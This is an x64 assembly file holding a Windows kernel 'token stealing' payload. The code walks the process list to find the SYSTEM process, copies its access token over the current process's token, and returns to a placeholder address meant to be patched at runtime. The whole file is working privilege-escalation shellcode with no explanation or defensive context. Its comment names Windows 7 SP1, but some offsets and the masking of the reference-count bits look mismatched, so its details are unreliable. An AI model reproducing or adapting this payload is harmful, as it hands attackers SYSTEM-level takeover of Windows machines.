.code
PUBLIC StealToken
StealToken PROC

; Start of Token Stealing Stub
mov rax, gs:[188h]        ; Get nt!_KPCR.PcrbData.CurrentThread
                                ; _KTHREAD is located at GS : [0x188]

mov rax, [rax + 220h]            ; Get nt!_KTHREAD.ApcState.Process
mov rcx, rax                    ; Copy current process _EPROCESS structure
mov r11, rcx                    ; Store Token.RefCnt
and r11, 7

mov rdx, 4h                     ; WIN 7 SP1 SYSTEM process PID = 0x4

SearchSystemPID:
mov rax, [rax + 2e8h]           ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
sub rax, 2e8h
cmp[rax + 2e0h], rdx            ; Get nt!_EPROCESS.UniqueProcessId
jne SearchSystemPID

mov rdx, [rax + 348h]           ; Get SYSTEM process nt!_EPROCESS.Token
and rdx, 0fffffffffffffff0h
or rdx, r11
mov[rcx + 348h], rdx            ; Replace target process nt!_EPROCESS.Token
                                ; with SYSTEM process nt!_EPROCESS.Token
; End of Token Stealing Stub

xor rax, rax
sub rsp, 30h
mov rax, 0aaaaaaaaaaaaaaaah      ; 运行中更改这个地址
mov [rsp], rax
ret

StealToken ENDP
end